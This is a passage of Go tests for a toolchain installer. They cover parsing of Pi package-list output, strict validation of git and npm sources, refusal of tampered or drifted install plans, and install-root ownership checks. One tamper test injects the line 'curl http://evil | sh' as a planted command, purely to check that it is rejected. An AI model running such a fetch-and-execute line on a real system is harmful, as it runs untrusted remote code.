		{name: "one-component https repository alone", output: "User packages:\n  git:https://example.com/user\n", want: listUnverified},
		{name: "one-component https repository after unrelated npm", output: "User packages:\n  npm:other-package@1.0.0\n  git:https://example.com/user\n", want: listUnverified},
		{name: "one-component https repository after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://example.com/user\n", want: listUnverified},
		{name: "one-component shorthand alone", output: "User packages:\n  git:example.com/user\n", want: listUnverified},
		{name: "one-component shorthand after unrelated npm", output: "User packages:\n  npm:other-package@1.0.0\n  git:example.com/user\n", want: listUnverified},
		{name: "one-component shorthand after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:example.com/user\n", want: listUnverified},
		{name: "one-component scp alone", output: "User packages:\n  git:git@example.com:user\n", want: listUnverified},
		{name: "one-component scp after unrelated npm", output: "User packages:\n  npm:other-package@1.0.0\n  git:git@example.com:user\n", want: listUnverified},
		{name: "one-component scp after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:git@example.com:user\n", want: listUnverified},
		{name: "slash only in the ref alone", output: "User packages:\n  git:https://github.com/user@v1/x\n", want: listUnverified},
		{name: "slash only in the ref after unrelated npm", output: "User packages:\n  npm:other-package@1.0.0\n  git:https://github.com/user@v1/x\n", want: listUnverified},
		{name: "slash only in the ref after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://github.com/user@v1/x\n", want: listUnverified},
		{name: "dotgit-only repository alone", output: "User packages:\n  git:https://github.com/.git\n", want: listUnverified},
		{name: "dotgit-only repository after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://github.com/.git\n", want: listUnverified},
		{name: "invalid utf8 escape alone", output: "User packages:\n  git:https://github.com/user/%FF/repo\n", want: listUnverified},
		{name: "invalid utf8 escape after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://github.com/user/%FF/repo\n", want: listUnverified},
		{name: "out-of-range dotted ipv4 host alone", output: "User packages:\n  git:https://999.999.999.999/owner/repo\n", want: listUnverified},
		{name: "out-of-range dotted ipv4 host after exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  git:https://999.999.999.999/owner/repo\n", want: listUnverified},
		{name: "ssh alias host record is recognized but unrelated", output: "User packages:\n  git:git@build01:user/repo\n", want: listAbsent},
		{name: "nested shorthand namespace is recognized but unrelated", output: "User packages:\n  git:github.com/group/sub/repo@v1\n", want: listAbsent},
		{name: "opaque relative local source after an unrelated npm record", output: "User packages:\n  npm:other-package@1.0.0\n  ./local-package\n", want: listUnverified},
		{name: "opaque absolute local source after an unrelated npm record", output: "User packages:\n  npm:other-package@1.0.0\n  /opt/local-package\n", want: listUnverified},
		{name: "opaque parent-relative local source after an unrelated npm record", output: "User packages:\n  npm:other-package@1.0.0\n  ../sibling-package\n", want: listUnverified},
		{name: "exact target followed by a local source row", output: "User packages:\n  npm:gentle-pi@3.7.0\n  ./local-package\n", want: listUnverified},
		{name: "bare npm prefix alongside an unrelated record", output: "User packages:\n  npm:other-package@1.0.0\n  npm:@@1.0.0\n", want: listUnverified},
		{name: "bare npm prefix after the exact target", output: "User packages:\n  npm:gentle-pi@3.7.0\n  npm:@@1.0.0\n", want: listUnverified},
		{name: "npm scope without a name", output: "User packages:\n  npm:@scope@1.0.0\n", want: listUnverified},
		{name: "npm empty scope", output: "User packages:\n  npm:@/name@1.0.0\n", want: listUnverified},
		{name: "npm range is unsupported", output: "User packages:\n  npm:other-package@^1.0.0\n", want: listUnverified},
		{name: "scoped npm record is recognized but unrelated", output: "User packages:\n  npm:@scope/other@1.0.0\n", want: listAbsent},
		{name: "detail path containing the target text is not scanned", output: "User packages:\n  npm:other-package@1.0.0\n    /home/u/.pi/packages/gentle-pi\n", want: listAbsent},
		{name: "indented detail line without a preceding record", output: "User packages:\n    /home/u/.pi/x\n", want: listUnverified},
		{name: "tab-indented record is ambiguous", output: "User packages:\n\tnpm:gentle-pi@3.7.0\n", want: listUnverified},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got, _ := classifyPiPackageList(testCase.output, "gentle-pi", "3.7.0")
			if got != testCase.want {
				t.Fatalf("classifyPiPackageList = %s, want %s", got, testCase.want)
			}
		})
	}
}

// TestSupportedGitSource pins the shared conservative repository-path/ref
// contract applied to every recognized git source form: an HTTPS/SSH URL, an
// scp-style `git@host:namespace/repo`, and a dotted-host/localhost shorthand. A
// source must resolve to a host plus at least two meaningful namespace/repository
// segments, with the first `@ref` split off first so a slash in the ref never
// satisfies repository depth. Unsafe raw or encoded forms, terminal `.git`-only
// repositories, out-of-range/ambiguous URL hosts and ports, non-canonical or
// unsupported schemes, and the ambiguous `user@host/slash` shape are refused. No
// network lookup is performed and no Pi grammar is invented.
func TestSupportedGitSource(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		want    bool
	}{
		{name: "https url with repository path", payload: "https://github.com/user/repo", want: true},
		{name: "https url with userinfo", payload: "https://user@github.com/user/repo", want: true},
		{name: "https url with explicit port", payload: "https://github.com:443/user/repo", want: true},
		{name: "https url with nested path and terminal dotgit", payload: "https://gitlab.com/group/sub/repo.git", want: true},
		{name: "https url with query", payload: "https://github.com/user/repo?ref=v1", want: true},
		{name: "ssh url with user", payload: "ssh://git@github.com/user/repo", want: true},
		{name: "ssh url with explicit port", payload: "ssh://git@github.com:22/user/repo", want: true},
		{name: "shorthand host and path with ref", payload: "github.com/example/pi-tools@v1", want: true},
		{name: "shorthand nested namespace", payload: "github.com/group/sub/repo", want: true},
		{name: "shorthand terminal dotgit", payload: "github.com/user/repo.git", want: true},
		{name: "shorthand ref containing a slash after a valid repo", payload: "github.com/user/repo@feature/x", want: true},
		{name: "localhost shorthand", payload: "localhost/user/repo", want: true},
		{name: "scp style with user", payload: "git@github.com:user/repo", want: true},
		{name: "scp style with terminal dotgit and ref", payload: "git@github.com:user/repo.git@v1", want: true},
		{name: "scp style on localhost", payload: "git@localhost:user/repo", want: true},

		// Deliberately stricter than Pi's permissive parse: an uppercase protocol
		// and the ambiguous `user@host/slash` shape are kept unverified rather
		// than accepted, so this backend can never certify absence from them.
		{name: "uppercase https scheme", payload: "HTTPS://github.com/user/repo", want: false},
		{name: "ambiguous user-at-host with slash", payload: "git@github.com/user/repo", want: false},

		{name: "https url with one repository component", payload: "https://example.com/user", want: false},
		{name: "shorthand with one repository component", payload: "example.com/user", want: false},
		{name: "shorthand host without a dot or localhost", payload: "myhost/user/repo", want: false},
		{name: "scp with one repository component", payload: "git@example.com:user", want: false},
		{name: "slash only in the ref cannot supply repository depth", payload: "https://github.com/user@v1/x", want: false},
		{name: "shorthand slash only in the ref cannot supply depth", payload: "github.com/repo@v1/x", want: false},
		{name: "scp slash only in the ref cannot supply depth", payload: "git@github.com:repo@v1/x", want: false},
		{name: "https url with dotgit-only repository", payload: "https://github.com/.git", want: false},
		{name: "shorthand with dotgit-only repository", payload: "github.com/.git", want: false},
		{name: "scp with dotgit-only repository", payload: "git@github.com:.git", want: false},
		{name: "scp absolute repository path", payload: "git@github.com:/user/repo", want: false},
		{name: "https url with parent-directory segment", payload: "https://github.com/../repo", want: false},
		{name: "shorthand with parent-directory segment", payload: "github.com/../../repo", want: false},
		{name: "scp with parent-directory segment", payload: "git@github.com:user/..", want: false},
		{name: "shorthand with backslash", payload: "github.com/user\\repo", want: false},
		{name: "https url with NUL", payload: "https://github.com/user\x00repo", want: false},
		{name: "shorthand with NUL", payload: "github.com/user\x00repo", want: false},
		{name: "https url with encoded parent-directory escape", payload: "https://github.com/user/%2e%2e/repo", want: false},
		{name: "shorthand with malformed percent escape", payload: "github.com/user/%ZZ/repo", want: false},
		{name: "https url with out-of-range port", payload: "https://github.com:70000/user/repo", want: false},
		{name: "https url with zero port", payload: "https://github.com:0/user/repo", want: false},
		{name: "bracketed ipv6 host stays unverified", payload: "https://[::1]/user/repo", want: false},
		{name: "bare numeric host stays unverified", payload: "https://2130706433/user/repo", want: false},
		{name: "out-of-range dotted ipv4 host stays unverified", payload: "https://999.999.999.999/owner/repo", want: false},
		{name: "in-range dotted-decimal ipv4 host is conservatively excluded", payload: "https://192.168.0.1/owner/repo", want: false},
		{name: "hex-ended final host label stays unverified", payload: "https://example.0x1f/owner/repo", want: false},
		{name: "mixed hex and decimal final host label", payload: "https://192.168.0x1/owner/repo", want: false},
		{name: "out-of-range dotted ipv4 with trailing dot", payload: "https://999.999.999.999./owner/repo", want: false},
		{name: "ordinary dns host with trailing dot stays recognized", payload: "https://github.com./user/repo", want: true},
		{name: "ssh alias host stays recognized", payload: "git@build01:user/repo", want: true},
		{name: "localhost ssh url stays recognized", payload: "ssh://localhost/user/repo", want: true},
		{name: "url with invalid utf8 escape", payload: "https://github.com/user/%FF/repo", want: false},
		{name: "scp with invalid utf8 escape", payload: "git@github.com:user/%FF/repo", want: false},
		{name: "shorthand with invalid utf8 escape", payload: "github.com/user/%FF/repo", want: false},
		{name: "url with invalid utf8 surrogate escape", payload: "https://github.com/user/%ED%A0%80/repo", want: false},
		{name: "shorthand with invalid utf8 surrogate escape", payload: "github.com/user/%ED%A0%80/repo", want: false},
		{name: "valid utf8 encoded control stays recognized", payload: "https://github.com/user/%01/repo", want: true},

		{name: "url missing double slash", payload: "https:/user/repo", want: false},
		{name: "url scheme only", payload: "https:", want: false},
		{name: "url double slash without host or path", payload: "https://", want: false},
		{name: "url missing host", payload: "https:///user/repo", want: false},
		{name: "url host without repository path", payload: "https://github.com", want: false},
		{name: "url root path only", payload: "https://github.com/", want: false},
		{name: "port-only authority without hostname", payload: "https://:443/user/repo", want: false},
		{name: "userinfo port-only authority without hostname", payload: "https://user@:443/user/repo", want: false},
		{name: "userinfo without hostname", payload: "https://user@/user/repo", want: false},
		{name: "ssh port-only authority without hostname", payload: "ssh://:22/user/repo", want: false},
		{name: "arbitrary hierarchical ftp scheme", payload: "ftp://github.com/user/repo", want: false},
		{name: "file scheme stays unverified", payload: "file:///user/repo", want: false},
		{name: "git scheme stays unverified", payload: "git://github.com/user/repo", want: false},
		{name: "http scheme stays unverified", payload: "http://github.com/user/repo", want: false},
		{name: "malformed ssh url with single slash", payload: "ssh:/user/repo", want: false},
		{name: "malformed ssh url with empty host", payload: "ssh://", want: false},
		{name: "malformed ssh url with triple slash", payload: "ssh:///user/repo", want: false},
		{name: "opaque scheme without hierarchy", payload: "mailto:user@example.com", want: false},
		{name: "colon host without scp user", payload: "github.com:user/repo", want: false},
		{name: "leading whitespace", payload: " https://github.com/user/repo", want: false},
		{name: "trailing whitespace", payload: "https://github.com/user/repo ", want: false},
		{name: "internal whitespace", payload: "https://git hub.com/user/repo", want: false},
		{name: "whitespace only", payload: "   ", want: false},
		{name: "empty payload", payload: "", want: false},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			if got := supportedGitSource(testCase.payload); got != testCase.want {
				t.Fatalf("supportedGitSource(%q) = %v, want %v", testCase.payload, got, testCase.want)
			}
		})
	}
}

// TestSplitNpmSource pins the conservative npm record grammar this classifier
// accepts: only a validated registry name with a plain semver version is a
// recognized record. A bare "@" prefix, an empty scope, a missing version, and
// a range stay unsupported instead of counting as a supported registration. It
// is a small validated subset, not a general npm-spec parser.
func TestSplitNpmSource(t *testing.T) {
	cases := []struct {
		name        string
		source      string
		wantName    string
		wantVersion string
		wantOK      bool
	}{
		{name: "unscoped name with version", source: "npm:gentle-pi@3.7.0", wantName: "gentle-pi", wantVersion: "3.7.0", wantOK: true},
		{name: "scoped name with version", source: "npm:@earendil-works/pi-coding-agent@0.87.1", wantName: "@earendil-works/pi-coding-agent", wantVersion: "0.87.1", wantOK: true},
		{name: "prerelease version", source: "npm:tool@1.2.3-beta.1", wantName: "tool", wantVersion: "1.2.3-beta.1", wantOK: true},
		{name: "build metadata version", source: "npm:tool@1.2.3+build.5", wantName: "tool", wantVersion: "1.2.3+build.5", wantOK: true},
		{name: "bare npm prefix", source: "npm:@@1.0.0", wantOK: false},
		{name: "scope without a name", source: "npm:@scope@1.0.0", wantOK: false},
		{name: "empty scope", source: "npm:@/name@1.0.0", wantOK: false},
		{name: "missing version", source: "npm:gentle-pi", wantOK: false},
		{name: "range is unsupported", source: "npm:gentle-pi@^3.7.0", wantOK: false},
		{name: "leading separator in name", source: "npm:-bad@1.0.0", wantOK: false},
		{name: "non npm prefix", source: "git:github.com/x/y", wantOK: false},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			name, version, ok := splitNpmSource(testCase.source)
			if ok != testCase.wantOK {
				t.Fatalf("splitNpmSource(%q) ok = %v, want %v", testCase.source, ok, testCase.wantOK)
			}
			if name != testCase.wantName || version != testCase.wantVersion {
				t.Fatalf("splitNpmSource(%q) = (%q, %q), want (%q, %q)", testCase.source, name, version, testCase.wantName, testCase.wantVersion)
			}
		})
	}
}

func TestExecuteRefusesChangedDestinationsBeforeWrites(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	consent := Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()}

	otherRoot := t.TempDir()
	changedRoot := harness.cfg
	changedRoot.InstallRoot = otherRoot
	report, err := Execute(context.Background(), changedRoot, harness.plan, consent)
	if !errors.Is(err, ErrPlanDrift) {
		t.Fatalf("expected ErrPlanDrift for a changed install root, got %v", err)
	}
	if report.Failed {
		t.Errorf("a refused pre-write check must not report partial work")
	}
	assertDirEmpty(t, otherRoot)
	if len(harness.downloader.calls) != 0 {
		t.Errorf("changed root must refuse before any download: %v", harness.downloader.calls)
	}
	for _, call := range harness.runner.calls {
		if len(call.Args) > 0 && (call.Args[0] == "install" || call.Args[0] == "list") {
			t.Errorf("changed root must refuse before installer commands: %v", call)
		}
	}

	otherWorkspace := t.TempDir()
	changedWorkspace := harness.cfg
	changedWorkspace.WorkspaceDir = otherWorkspace
	if _, err := Execute(context.Background(), changedWorkspace, harness.plan, consent); !errors.Is(err, ErrPlanDrift) {
		t.Fatalf("expected ErrPlanDrift for a changed workspace, got %v", err)
	}
	if _, err := os.Stat(filepath.Join(otherWorkspace, ".pi")); !os.IsNotExist(err) {
		t.Errorf("changed workspace must not receive payload output")
	}
}

func TestExecuteRefusesTamperedPlanFields(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	approved := harness.plan.Fingerprint()
	mutations := []struct {
		name string
		edit func(*Plan)
	}{
		{name: "outputs", edit: func(plan *Plan) { plan.Steps[0].Outputs = append(plan.Steps[0].Outputs, "/tmp/evil") }},
		{name: "effects", edit: func(plan *Plan) { plan.Steps[0].Effects = append(plan.Steps[0].Effects, "undeclared effect") }},
		{name: "command", edit: func(plan *Plan) { plan.Steps[0].Command = "curl http://evil | sh" }},
		{name: "reason", edit: func(plan *Plan) { plan.Steps[0].Reason = "tampered reason" }},
		{name: "component", edit: func(plan *Plan) { plan.Steps[0].Component = ComponentGodot }},
		{name: "godotRequired", edit: func(plan *Plan) { plan.GodotRequired = !plan.GodotRequired }},
		{name: "observed component", edit: func(plan *Plan) { plan.Steps[0].Observed.Component = ComponentGodot }},
		{name: "observed version", edit: func(plan *Plan) { plan.Steps[0].Observed.Version = "0.0.1" }},
	}
	for _, mutation := range mutations {
		t.Run(mutation.name, func(t *testing.T) {
			tampered := clonePlan(harness.plan)
			mutation.edit(&tampered)
			_, err := Execute(context.Background(), harness.cfg, tampered, Consent{Approved: true, PlanFingerprint: approved})
			if !errors.Is(err, ErrPlanDrift) {
				t.Fatalf("expected ErrPlanDrift after tampering %s, got %v", mutation.name, err)
			}
		})
	}
	if len(harness.downloader.calls) != 0 {
		t.Errorf("a tampered plan must refuse before any download")
	}
}

// TestExecuteBindsDisplayedGodotRequired proves the public Plan.GodotRequired is
// part of the approved digest even when the normalized binding still agrees, and
// that a changed execution-config Godot requirement is refused.
func TestExecuteBindsDisplayedGodotRequired(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	consent := Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()}
	if !harness.plan.GodotRequired {
		t.Fatalf("harness plan must carry the approved Godot requirement")
	}

	// Positive: the untampered approved plan still executes with the newly bound
	// displayed fields.
	report, err := Execute(context.Background(), harness.cfg, harness.plan, consent)
	if err != nil {
		t.Fatalf("approved plan with GodotRequired=true must execute: %v", err)
	}
	if report.Failed {
		t.Fatalf("approved plan failed: %+v", report.Entries)
	}

	downloadsBefore := len(harness.downloader.calls)

	// Tampering only the public displayed flag (leaving the binding intact) must
	// refuse before any further effect.
	tampered := clonePlan(harness.plan)
	tampered.GodotRequired = false
	if _, err := Execute(context.Background(), harness.cfg, tampered, consent); !errors.Is(err, ErrPlanDrift) {
		t.Fatalf("expected ErrPlanDrift when only Plan.GodotRequired is tampered, got %v", err)
	}
	if len(harness.downloader.calls) != downloadsBefore {
		t.Errorf("tampered GodotRequired must refuse before any download")
	}

	// Changing the execution config's Godot requirement must also refuse.
	changed := harness.cfg
	changed.GodotRequired = false
	if _, err := Execute(context.Background(), changed, harness.plan, consent); !errors.Is(err, ErrPlanDrift) {
		t.Fatalf("expected ErrPlanDrift when the config Godot requirement changes, got %v", err)
	}
	if len(harness.downloader.calls) != downloadsBefore {
		t.Errorf("changed Godot requirement must refuse before any download")
	}
}

func TestPiReuseUsesManagedNodePath(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{piRequiresManagedNode: true})
	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("Pi must verify under the managed Node PATH; report failed: %+v", report.Entries)
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentPi] != OutcomeInstalled {
		t.Errorf("Pi outcome = %s, want installed", outcomes[ComponentPi])
	}
}

func TestMissingNpmIsNotReportedAsSuccess(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{omitNodeNpm: true})
	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if !report.Failed {
		t.Fatalf("a missing npm must not be reported as success: %+v", report.Entries)
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentNpm] != OutcomeFailed {
		t.Errorf("npm outcome = %s, want failed", outcomes[ComponentNpm])
	}
	if _, ok := outcomes[ComponentPi]; ok {
		t.Errorf("Pi must not run when npm could not be provided")
	}
}

func TestSecondRunReusesManagedNodeAndNpm(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	// The regression must rely on ordinary PATH detection, not explicit paths,
	// because explicit NodePath/NpmPath previously masked the layout bug.
	if harness.cfg.NodePath != "" || harness.cfg.NpmPath != "" || harness.cfg.PiPath != "" {
		t.Fatalf("the reuse regression must not set explicit executable paths")
	}
	first, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("first execute error: %v", err)
	}
	if first.Failed {
		t.Fatalf("first execute failed: %+v", first.Entries)
	}
	downloadsAfterFirst := len(harness.downloader.calls)

	npmLink := filepath.Join(harness.installRoot, "node", "24.21.0", "bin", "npm")
	if info, err := os.Lstat(npmLink); err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("expected a preserved managed npm symlink after the first install: %v", err)
	}

	_, secondPlan, err := Prepare(context.Background(), harness.cfg)
	if err != nil {
		t.Fatalf("second Prepare failed: %v", err)
	}
	second, err := Execute(context.Background(), harness.cfg, secondPlan, Consent{Approved: true, PlanFingerprint: secondPlan.Fingerprint()})
	if err != nil {
		t.Fatalf("second execute error: %v", err)
	}
	if second.Failed {
		t.Fatalf("second execute failed: %+v", second.Entries)
	}
	if len(harness.downloader.calls) != downloadsAfterFirst {
		t.Errorf("second run re-downloaded archives: before=%v after=%v", downloadsAfterFirst, harness.downloader.calls)
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range second.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentNode] != OutcomeReused {
		t.Errorf("managed Node outcome = %s, want reused", outcomes[ComponentNode])
	}
	if outcomes[ComponentNpm] != OutcomeReused {
		t.Errorf("managed npm outcome = %s, want reused", outcomes[ComponentNpm])
	}
	if info, err := os.Lstat(npmLink); err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Errorf("npm symlink was not preserved on reuse: %v", err)
	}
}

func TestMissingNpmBootstrapsPinnedNodeBundle(t *testing.T) {
	hostDir := t.TempDir()
	hostNode := filepath.Join(hostDir, "node")
	original := []byte("#!/bin/sh\necho host-node\n")
	if err := os.WriteFile(hostNode, original, 0o755); err != nil {
		t.Fatalf("write host node: %v", err)
	}
	harness := newInstallHarness(t, harnessOptions{hostNodePath: hostNode})
	if harness.plan.Blocked() {
		t.Fatalf("compatible Node with missing npm must not block: %+v", harness.plan.Steps)
	}
	var npmStep PlanStep
	for _, step := range harness.plan.Steps {
		if step.Component == ComponentNpm {
			npmStep = step
		}
	}
	if npmStep.Action != ActionInstall {
		t.Fatalf("npm step action = %s, want install", npmStep.Action)
	}
	if !strings.Contains(npmStep.Command, "npm provider") || len(npmStep.Outputs) == 0 {
		t.Fatalf("npm step must disclose a concrete owned action: %+v", npmStep)
	}

	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("expected a successful npm bootstrap: %+v", report.Entries)
	}
	hostBin := filepath.Dir(hostNode)
	managedNodeBin := filepath.Join(harness.installRoot, "node", "24.21.0", "bin")
	if report.Launch.NodeBinDir != hostBin {
		t.Errorf("Launch.NodeBinDir = %q, want the reused host Node bin %q", report.Launch.NodeBinDir, hostBin)
	}
	if report.Launch.NpmExecutable != filepath.Join(managedNodeBin, "npm") {
		t.Errorf("Launch.NpmExecutable = %q, want the managed npm provider", report.Launch.NpmExecutable)
	}
	assertNpmInstallUsesSelectedNode(t, harness.runner.calls, hostBin, managedNodeBin)
	after, err := os.ReadFile(hostNode)
	if err != nil {
		t.Fatalf("read host node: %v", err)
	}
	if string(after) != string(original) {
		t.Errorf("the reused host Node was modified")
	}
	if info, err := os.Lstat(filepath.Join(harness.installRoot, "node", "24.21.0", "bin", "npm")); err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Errorf("managed npm provider missing: %v", err)
	}
	downloads := len(harness.downloader.calls)

	_, secondPlan, err := Prepare(context.Background(), harness.cfg)
	if err != nil {
		t.Fatalf("second Prepare: %v", err)
	}
	second, err := Execute(context.Background(), harness.cfg, secondPlan, Consent{Approved: true, PlanFingerprint: secondPlan.Fingerprint()})
	if err != nil || second.Failed {
		t.Fatalf("second run failed: err=%v report=%+v", err, second.Entries)
	}
	if len(harness.downloader.calls) != downloads {
		t.Errorf("rerun re-downloaded the npm provider")
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range second.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentNpm] != OutcomeReused {
		t.Errorf("rerun npm outcome = %s, want reused", outcomes[ComponentNpm])
	}
	if second.Launch.NodeBinDir != hostBin {
		t.Errorf("rerun Launch.NodeBinDir = %q, want the reused host Node bin %q", second.Launch.NodeBinDir, hostBin)
	}
	if second.Launch.NpmExecutable != filepath.Join(managedNodeBin, "npm") {
		t.Errorf("rerun Launch.NpmExecutable = %q, want the managed npm provider", second.Launch.NpmExecutable)
	}
	assertNpmInstallUsesSelectedNode(t, harness.runner.calls, hostBin, managedNodeBin)
}

func TestPrepareRejectsSharedSystemInstallRoot(t *testing.T) {
	for _, root := range []string{"/", "/usr", "/usr/local/ogs", "/etc/ogs", "/home", "/var/ogs"} {
		t.Run(root, func(t *testing.T) {
			cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: root, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
			if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
				t.Fatalf("expected ErrUnsafeRoot for %q, got %v", root, err)
			}
		})
	}
}

func TestPrepareAllowsOwnedTempRoot(t *testing.T) {
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: t.TempDir(), Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
	if _, _, err := Prepare(context.Background(), cfg); err != nil {
		t.Fatalf("owned temp root must be accepted: %v", err)
	}
}

func TestPrepareRejectsForeignOwnedInstallRoot(t *testing.T) {
	original := ownerResolver
	t.Cleanup(func() { ownerResolver = original })
	root := t.TempDir()
	ownerResolver = func(path string, info os.FileInfo) (uint32, bool) {
		if filepath.Clean(path) == filepath.Clean(root) {
			return 4242, true
		}
		return original(path, info)
	}
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: root, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
	if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("foreign-owned managed root must be rejected, got %v", err)
	}
}

// installOwnerSeam fakes ownership metadata without changing real filesystem
// ownership. overrides maps cleaned absolute paths to a faked uid; every other
// path reports its real platform owner. currentUID fakes the process user id.
func installOwnerSeam(t *testing.T, currentUID uint32, overrides map[string]uint32) {
	t.Helper()
	previousResolver := ownerResolver
	previousUID := currentUserID
	previousTrusted := trustedCreationRoots
	ownerResolver = func(path string, info os.FileInfo) (uint32, bool) {
		if uid, ok := overrides[filepath.Clean(path)]; ok {
			return uid, true
		}
		return platformOwnerResolver(path, info)
	}
	currentUserID = func() (uint32, bool) { return currentUID, true }
	t.Cleanup(func() {
		ownerResolver = previousResolver
		currentUserID = previousUID
		trustedCreationRoots = previousTrusted
	})
}

func realUserID(t *testing.T) uint32 {
	t.Helper()
	uid, ok := platformCurrentUserID()
	if !ok {
		t.Skip("ownership checks are unsupported on this platform")
	}
	return uid
}

// TestOwnershipRejectsForeignAncestorEvenWhenNotWritable proves that a
// non-root, non-current ancestor controls its children even at mode 0755, so an
// owned leaf beneath it is still refused.
func TestOwnershipRejectsForeignAncestorEvenWhenNotWritable(t *testing.T) {
	uid := realUserID(t)
	base := t.TempDir()
	foreign := filepath.Join(base, "foreign")
	if err := os.Mkdir(foreign, 0o755); err != nil {
		t.Fatalf("mkdir foreign: %v", err)
	}
	leaf := filepath.Join(foreign, "owned-leaf")
	if err := os.Mkdir(leaf, 0o700); err != nil {
		t.Fatalf("mkdir leaf: %v", err)
	}
	installOwnerSeam(t, uid, map[string]uint32{filepath.Clean(foreign): uid + 1000})
	if err := validateOwnedRoot(leaf); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a foreign 0755 ancestor must be rejected, got %v", err)
	}
}

// TestOwnershipRejectsMissingRootUnderForeignAncestor proves the creation-parent
// check refuses a missing component beneath a foreign 0755 ancestor.
func TestOwnershipRejectsMissingRootUnderForeignAncestor(t *testing.T) {
	uid := realUserID(t)
	base := t.TempDir()
	foreign := filepath.Join(base, "foreign")
	if err := os.Mkdir(foreign, 0o755); err != nil {
		t.Fatalf("mkdir foreign: %v", err)
	}
	installOwnerSeam(t, uid, map[string]uint32{filepath.Clean(foreign): uid + 1000})
	if err := validateOwnedRoot(filepath.Join(foreign, "newroot")); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a missing root under a foreign ancestor must be rejected, got %v", err)
	}
}

// TestOwnershipRejectsMissingRootUnderRootOwnedNonStickyParent proves a missing
// component beneath a root-owned but non-sticky parent is refused instead of
// being created optimistically.
func TestOwnershipRejectsMissingRootUnderRootOwnedNonStickyParent(t *testing.T) {
	uid := realUserID(t)
	if uid == 0 {
		t.Skip("running as root makes the fake root-owned parent indistinguishable from the current user")
	}
	base := t.TempDir()
	rootOwned := filepath.Join(base, "rootowned")
	if err := os.Mkdir(rootOwned, 0o755); err != nil {
		t.Fatalf("mkdir rootowned: %v", err)
	}
	installOwnerSeam(t, uid, map[string]uint32{filepath.Clean(rootOwned): 0})
	if err := validateOwnedRoot(filepath.Join(rootOwned, "newroot")); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a missing root under a root-owned non-sticky parent must be rejected, got %v", err)
	}
}

// TestOwnershipAllowsOwnedParentAndTrustedStickyTempCreation proves the two
// accepted creation cases: a current-user-owned parent, and a narrowly trusted
// root-owned sticky shared temp base.
func TestOwnershipAllowsOwnedParentAndTrustedStickyTempCreation(t *testing.T) {
	uid := realUserID(t)
	base := t.TempDir()
	if err := validateOwnedRoot(filepath.Join(base, "newroot")); err != nil {
		t.Fatalf("a missing root under a current-user-owned parent must be allowed: %v", err)
	}

	sticky := filepath.Join(base, "sticky")
	if err := os.Mkdir(sticky, 0o700); err != nil {
		t.Fatalf("mkdir sticky: %v", err)
	}
	if err := os.Chmod(sticky, 0o777|os.ModeSticky); err != nil {
		t.Fatalf("chmod sticky: %v", err)
	}
	installOwnerSeam(t, uid, map[string]uint32{filepath.Clean(sticky): 0})
	trustedCreationRoots = func() []string { return []string{filepath.Clean(sticky)} }
	if err := validateOwnedRoot(filepath.Join(sticky, "newroot")); err != nil {
		t.Fatalf("a missing root under a trusted root-owned sticky temp base must be allowed: %v", err)
	}
}

// TestOwnershipRejectsMissingFirstChildUnderFilesystemRoot proves the walk
// initializes the filesystem-root metadata before walking components: a missing
// first component has the filesystem root as its creation parent, which is
// refused rather than accepted as an unknown empty parent.
func TestOwnershipRejectsMissingFirstChildUnderFilesystemRoot(t *testing.T) {
	missing := filepath.Join(string(filepath.Separator), "ogs-piinstall-missing-first-child")
